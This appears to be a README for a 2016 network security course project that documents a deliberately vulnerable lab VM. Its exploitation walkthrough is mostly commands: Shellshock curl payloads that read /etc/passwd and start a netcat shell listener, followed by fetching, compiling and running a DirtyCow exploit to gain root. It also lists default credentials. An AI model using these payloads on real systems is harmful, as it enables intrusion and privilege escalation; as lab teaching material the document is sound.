# Network Security 2016 Project


### VM

Can be downloaded at ...TODO

**Users:** 

* root:root
* netsec:netsec


### How to Exploit

Shellshock:
```
curl -H "User-Agent: () { :; }; echo \"Content-type: text/plain\"; echo \"\"; echo \"\"; /bin/cat /etc/passwd" 192.168.1.110/cgi-bin/index.cgi
```

Reverse Shell:
```
curl -H "User-Agent: () { :; }; /bin/netcat -e /bin/bash -l -p 12345" 192.168.1.110/cgi-bin/index.cgi
```

Connect to Reverse Shell:
```
netcat 192.168.1.110 12345
```

Information Gathering:
```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Exploit dirtycow:
```
cd /tmp
wget <url>/c0w.c --no-check-certificate
gcc -pthread c0w.c -o c0w
./c0w

(Wait...)

/usr/bin/passwd
id
uid=0(root) gid=0(root) groups=0(root)
```
